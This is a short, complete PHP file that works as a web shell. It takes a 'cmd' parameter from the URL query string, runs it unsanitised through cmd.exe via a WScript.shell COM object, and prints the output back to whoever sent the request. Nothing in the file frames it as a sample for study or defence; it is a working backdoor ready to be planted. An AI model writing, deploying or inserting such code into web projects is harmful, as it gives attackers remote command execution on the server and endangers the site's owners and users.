<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec('cmd.exe /c '.$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>